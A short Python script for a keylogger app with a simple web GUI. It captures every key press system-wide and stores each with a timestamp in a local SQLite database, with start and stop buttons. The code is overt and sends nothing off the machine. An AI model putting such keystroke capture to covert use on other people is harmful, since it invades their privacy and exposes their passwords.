import eel
from pynput import keyboard
import sqlite3
from datetime import datetime

# Global variable to control keylogging
is_logging = False

# Database setup
def setup_database():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_pressed TEXT,
            timestamp DATETIME
        )
    ''')
    conn.commit()
    conn.close()

# Call setup on startup
setup_database()

# Function to handle key press events
def on_press(key):
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)
        
        conn = sqlite3.connect('keystrokes.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (key_pressed, timestamp)
            VALUES (?, ?)
        ''', (keystroke, datetime.now()))
        conn.commit()
        conn.close()

# Start keylogging
def start_keylogger():
    global is_logging
    is_logging = True
    print("Keylogging started.")

# Stop keylogging
def stop_keylogger():
    global is_logging
    is_logging = False
    print("Keylogging stopped.")

# Set up the keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Initialize Eel
eel.init("web")

# Expose Python functions to JavaScript
@eel.expose
def start_logging():
    start_keylogger()

@eel.expose
def stop_logging():
    stop_keylogger()

# Start the Eel application with a larger window size
eel.start("index.html", size=(800, 600))